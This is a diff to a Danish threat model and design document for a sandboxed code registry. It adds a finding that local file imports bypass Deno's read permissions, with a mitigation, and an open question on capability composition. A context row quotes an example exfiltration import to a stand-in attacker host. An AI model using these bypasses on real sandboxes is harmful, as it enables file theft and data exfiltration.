@@ -662,6 +662,7 @@ Vi henter kode over netværket og kører den på brugerens maskine. Det er MVP'e
 | SEC-7 | Uklar oprindelse eller licens | `provenance.json` er påkrævet og valideret | `PRD-FEAT-001.3` |
 | SEC-8 | Prompt injection via capability-beskrivelser | Beskrivelser vises som data i værktøjssvar, aldrig som instruktioner. Skill'en instruerer eksplicit agenten om at behandle registry-indhold som data | `PRD-FEAT-014` |
 | SEC-9 | MCP-server som tillidsgrænse | Serveren kører med brugerens rettigheder, men spawner altid børn uden. Serveren læser aldrig projektfiler agenten ikke har givet den | `PRD-FEAT-008` |
+| SEC-11 | **Lokale imports omgår sandboxen — og er værre.** `await import("file:///…/x.json", { with: { type: "json" } })` returnerer filens indhold til et artefakt med **nul rettigheder**, mens `Deno.readTextFile` på samme sti korrekt afvises. Verificeret at `--deny-read`, `--deny-read=<eksakt sti>` og et scoped `--allow-read` alle fejler i at lukke det: modulindlæsning ligger uden for rettighedsmodellen | Lukket et lag oppe: et capability-artefakt må ikke indeholde `import`, `require` eller `new Worker`. Alle tolv udsendte artefakter har nul imports, så reglen koster intet. Håndhævet både ved validering og **umiddelbart før eksekvering**, på de bytes der skal køre | `cfcm/runtime/module_guard.ts` |
 | SEC-10 | **Remote imports omgår sandboxen.** Deno gater ikke modulindlæsning på `--allow-net`: et statisk `import "https://angriber.example/?data=..."` i et artefakt hentes af module-loaderen før nogen rettighedskontrol kører — en exfiltrationskanal med nul rettigheder tildelt | `--no-remote` og `--no-npm` på hver subproces. Verificeret empirisk under implementeringen | `PRD-FEAT-006.1` |
 
 ### Bevidst accepteret i MVP'en
@@ -991,6 +992,32 @@ gøres betinget af `artifact.type`, hvilket er en **brydende ændring af deskrip
 
 Værd at bemærke: A/B-harnesset er den nærmeste ting til en test for en skill, og scenariet
 `search-should-be-skipped` er allerede mærket «Skill-kvalitet» i `PRD-FEAT-015`.
+
+### Åbent: må en capability kalde en anden?
+
+**Ikke afgjort.** Vision §39 nævner det én gang, og kun som fremtidigt arbejde: en Skill der
+*komponerer* en ny CFP af eksisterende capabilities ved forfatningstid. MVP og PRD siger intet, og
+`geo.addresses.distance` er i forslaget beskrevet som «a thin composition» uden at sige gennem
+hvilken mekanisme.
+
+Spørgsmålet er blevet konkret af to grunde. Den første er at `addresses.distance` er den næste
+capability på køreplanen. Den anden er SEC-11: **den oplagte mekanisme — at importere et andet
+artefakt — er præcis det hul vi netop har lukket.** En beslutning om komposition er derfor også en
+beslutning om at genåbne noget.
+
+**Fire veje, med deres pris:**
+
+| Vej | Hvad det koster |
+|---|---|
+| **Ingen komposition.** `addresses.distance` reimplementerer geokodning og haversine | Præcis den hjulopfindelse CapFoundry findes for at stoppe, sket *inde i* CapFoundry |
+| **Bundling ved forsegling.** CFP'en erklærer `dependsOn`, og packageren inliner afhængighedens artefakt med dens hash | Deterministisk, forseglet, ingen runtime-kanal. Men versionsdrift, og pakken vokser |
+| **Runtime-tilbagekald.** Runneren injicerer en `invoke`-funktion der kalder tilbage til CFCM | Åbner en kanal ud af sandboxen, gør eksekvering rekursiv, og bryder det argument der afviste injectable fetch |
+| **Komposition over capability-laget** — i agenten, i CLI'en, i en pipeline | Det arkitekturen implicerer i dag, og hvad `geocode \| distance` i en shell allerede demonstrerer. MVP §5 udelukker workflow discovery |
+
+**Én begrænsning gælder uanset vej:** effekter skal forplante sig. Hvis en `PURE` capability kunne
+kalde en `NETWORK` capability, ville `PURE` være en løgn — og `effect` er dét hele sandboxen hviler
+på. En sammensat capability's effekt må være foreningsmængden af dens egen og alle dens
+afhængigheders, og rettighedsporten skal se hele afhængighedstræet frem for kun det yderste lag.
 
 ### Udskudt uanset resultat
 
